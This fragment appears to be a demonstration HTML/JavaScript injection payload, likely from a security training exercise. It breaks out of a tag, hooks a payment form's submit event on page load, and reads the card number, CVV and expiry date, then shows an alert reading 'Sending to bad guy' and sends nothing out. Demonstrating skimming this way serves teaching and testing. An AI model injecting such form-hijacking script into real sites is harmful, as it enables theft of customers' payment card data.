/> <script language='javascript'> function sendCC(){  form = document.getElementById('sendForm');  cc = form.cc.value;  cvv = form.cvv.value;  year = form.expYear.value;  month = form.expMonth.value;  alert('Sending to bad guy cc:' + cc + ' date:' + month + '/
' + year + '
cvv:' + cvv); return sendPaymentRequest();} window.onload = function () {  var submitForm = document.getElementById('
sendForm
'); submitForm.setAttribute('
onsubmit
', '
sendCC()
'); }</script> <br